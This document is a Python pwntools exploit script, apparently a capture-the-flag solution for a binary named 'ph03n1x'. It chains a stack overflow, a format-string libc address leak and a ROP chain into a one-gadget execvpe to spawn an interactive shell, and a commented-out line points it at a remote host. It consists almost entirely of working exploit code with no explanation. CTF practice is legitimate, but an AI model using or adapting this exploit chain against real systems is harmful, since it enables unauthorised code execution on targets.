from pwn import *

exe = ELF("./ph03n1x")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
def conn():
    r = process([exe.path])
    #r = gdb.debug(exe.path, gdbscript="b main")
    #r = remote(host="35.228.25.255", port=31338)
    return r
rw = 0x0000000000601000 + 0x808 #0x404808
main_60 = 0x000000000040078b #0x40078e

def main():
    p = conn()
    p.sendline(b'A'*32 + p64(rw) + p64(main_60))
    p.recvline()
    p.sendline(b"%25$p\n\0" + b"A" * 39 + p64(exe.symbols['main'])) 
    p.recvline()
    p.recvline()
    libc.address = int(p.recvline().strip().decode(), 16)-0x29e40
    log.info(f"libc: {hex(libc.address)}")
    # p.sendline(b"A"*32 + p64(rw) + p64(libc.address + 0xebc81))
    live_spell = 0x601140#0x404060
    p.sendline(b'A'*32 + p64(live_spell-10) + p64(main_60))
    p.recvline()
    r = ROP(libc)
    live_spell_120 = 0x601140+120 #0x4040d8
    r(r12=0, r13=0, rbp=live_spell_120)
    r.call(libc.address + 0xebce2) #execvpe
    p.sendline(p64(0) + r.chain())
    p.recvline()
    # gdb.attach(p)
    #p.sendline(b"AA"
    p.interactive()

if __name__ == "__main__":
    main()